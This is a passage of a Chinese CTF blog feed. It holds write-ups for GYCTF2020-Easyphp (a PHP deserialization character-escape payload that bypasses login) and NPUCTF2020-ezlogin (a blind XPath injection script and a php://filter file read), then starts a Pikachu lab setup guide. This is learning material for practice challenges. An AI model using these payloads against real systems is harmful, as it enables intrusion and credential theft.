&#125;</span><br></pre></td></tr></table></figure><p>4.下面是safe()函数内容，可以看到把没有6字符的单词都替换了，这里一般情况下可能是没有多大问题的，但是我们可以控制序列化的内容进而控制反序列化的内容，看UpdateHelper类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.有个析构方法的内容如下，这里如果sql实例化为一个对象就能调用<code>__toString</code>魔术方法了，这里因为<code>User</code>类里面有这个魔术方法，下面看User类里面的该魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>6.__toString魔术方法如下，调用nickname下属的方法，如果将nickname实例化为Info类的一个对象，因为没有update方法，触发Info类的__call()方法，参数为<code>$age</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>7.__call方法如下，<code>$argument[0]</code>是我们传入的<code>$age</code>参数，如CtrlCase实例化为dbCtrl类的一个对象，就会调用<code>dbCtrl.login($sql)</code>，这样的话<code>$sql</code>参数就能被控制了，就是传入的<code>$age</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age =<span class="string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">UpdateHelper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是如果没有上面的safe()方法条件下的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">&quot;UpdateHelper&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;select 1,&quot;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&quot; from user where username=?&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;dbCtrl&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><p>如果直接传入正常参数的话，序列化之后是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;18&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;loveu&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>这里可以构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:70:&quot;</span>select <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="keyword">from</span> user where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>最后多加上个<code>&#125;</code>闭合，就会造成如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;18&quot;</span>;s:<span class="number">263</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">12</span>:<span class="string">&quot;UpdateHelper&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;select 1,&quot;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&quot; from user where username=?&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;dbCtrl&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/GYCTF2020-Easyphp//1.png"><br>虽然那里是263，但是事实上里面没有长度，长度为零</p><p><strong>字符逃逸原理</strong><br>这时候如果我们把整个nickname的payload之前加上263个<code>union</code>，到时过safe()会自动变为<code>hacker</code>，长度增长了263位<br>用个公式总结吧就是</p><blockquote><p>263<em>5+263 &#x3D; 263</em>6  (263<em>5表示union，+263表示我们需要塞进去的内容；后面的是hacker的263</em>6&lt;因为hacker是6个长，union是5个长&gt;)</p></blockquote><p>所以上传的最终的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age=<span class="number">1</span>&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:70:&quot;</span>select <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="keyword">from</span> user where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>后面的他自己生成的因为不符合反序列化的规则，此时应该是没用了。</p><p><strong>最后一步</strong><br>在<code>update.php</code>当中POST传入payload，然后再<code>login.php</code>任意密码登录admin账户(注意在同一个浏览器上面进行)，因为最开始的利用点还是从<code>update.php</code>页面开始的。<br><code>flag&#123;f72aca0f-6ed8-433d-862c-b522521283d3&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezlogin</title>
      <link href="/2020/11/30/NPUCTF2020-ezlogin/"/>
      <url>/2020/11/30/NPUCTF2020-ezlogin/</url>
      
        <content type="html"><![CDATA[<h2 id="1-判断-amp-注入"><a href="#1-判断-amp-注入" class="headerlink" title="1.判断&amp;注入"></a>1.判断&amp;注入</h2><p>输入用户名密码抓包发现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>1<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>2<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;<span class="name">token</span>&gt;</span>60bc2c51e1afba5e1f8d8896939TYwNj<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br></pre></td></tr></table></figure><p>是XPATH注入，下面给出先知上面关于XPATH注入的详解。<br><a href="https://xz.aliyun.com/t/7791#toc-6">Xpath盲注</a><br>然后可以在用户名这里测试payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or count(/)=1  or &#x27;&#x27;=&#x27;     ###根节点数量为1</span><br><span class="line">&#x27;or count(/*)=1 or &#x27;&#x27;=&#x27;   ##根节点下只有一个子节点</span><br></pre></td></tr></table></figure><p>然后用户名输入第一个<code>&#39;or count(/)=1 or &#39;&#39;=&#39;</code>显示非法操作，输入<code>&#39;or count(/)=0 or &#39;&#39;=&#39;</code>则显示用户名或密码错误，由此判断可能存在布尔类型盲注，直接写脚本吧，有个token限制了时间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://821c8f01-96e1-4a71-9954-1f22c9e87c88.node3.buuoj.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/xml&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">find =re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        payload_1 = <span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        payload_2 = <span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        payload_3 =<span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        payload_4 =<span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        payload_password =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#整合payload</span></span><br><span class="line">        payload = payload_password</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = s.post(url=url,headers=head,data=payload)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;非法操作&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;用户名&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>username:adm1n</code><br><code>password:cf7414b5bdb2e65ee43083f4ddbc4d9f</code>，密码需要md5解密<code>gtfly123</code></p><blockquote><p>布尔盲注，一个查询两个or</p></blockquote><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=Php://filter/convert.Base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><p><code>ZmxhZ3tlNDAyZTk0Mi1hNTgzLTQ0OWUtOGQ1MC1lZTlhYzFmNmZiNTN9Cg==</code></p><p><code>flag&#123;e402e942-a583-449e-8d50-ee9ac1f6fb53&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> xpath注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场Pikachu的简单学习</title>
      <link href="/2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>今天没多少时间了，就不来做题了，今天搞下Pikachu，太菜了，什么时候才能变强呢。。。又菜又笨又爱玩。<br><strong>可以先去BUU开一个pikachu的环境，当然也能自己搭建，自己搭建的话推荐在windows(phpstudy)或者docker上面也许会比较方便。</strong><br><a href="https://buuoj.cn/challenges#PikaChu">BUU之Pikachu环境地址</a></p><h1 id="Pikachu靶场相关介绍及其安装配置"><a href="#Pikachu靶场相关介绍及其安装配置" class="headerlink" title="Pikachu靶场相关介绍及其安装配置"></a>Pikachu靶场相关介绍及其安装配置</h1><p><img src="/2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0//1.png"><br>不好用，还是自己搭一下环境吧。在我的windows里面搭建。</p><h3 id="1-下载源代码"><a href="#1-下载源代码" class="headerlink" title="1.下载源代码"></a>1.下载源代码</h3><p>先从github上面拉下来pikachu的源码<br><a href="https://github.com/zhuifengshaonianhanlu/pikachu">github之Pikachu</a><br><a href="https://gitee.com/wayfeel/pikachu?_from=gitee_search">gitee之Pikachu</a><br>嫌弃github太慢的话可以在码云上面下载，不过要先注册账号，注册应该也浪费不了多长时间。</p><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><p>这里默认你已经安装过phpstudy了，没安可以再去安。</p><ul><li><p>1.把源码解压到WWW目录下，最好让文件夹名为pikachu到时候好找。<br><img src="/2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0//2.png"></p></li><li><p>2.进入inc文件夹下打开<code>config.inc.php</code>文件，修改下数据库的信息我改成了下面的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//全局session_start</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//全局居设置时区</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="comment">//全局设置默认字符</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//定义数据库连接参数</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBHOST&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);<span class="comment">//将localhost或者127.0.0.1修改为数据库服务器的地址</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBUSER&#x27;</span>, <span class="string">&#x27;pikachu&#x27;</span>);<span class="comment">//将root修改为连接mysql的用户名</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBPW&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);<span class="comment">//将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说！</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBNAME&#x27;</span>, <span class="string">&#x27;pikachu&#x27;</span>);<span class="comment">//自定义，建议不修改</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBPORT&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>);<span class="comment">//将3306修改为mysql的连接端口，默认tcp3306</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0//3.png"></p></li><li><p>3.打开PhpStudy后访问<code>http://127.0.0.1/pikachu/</code>界面就一切准备就绪了，但是xss后台界面好像出现了点问题，额，原来还要改，将pkxss目录下的inc目录下的config.inc.php文件的配置信息也修改一下为下面的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//全局session_start</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="comment">//全局居设置时区</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span 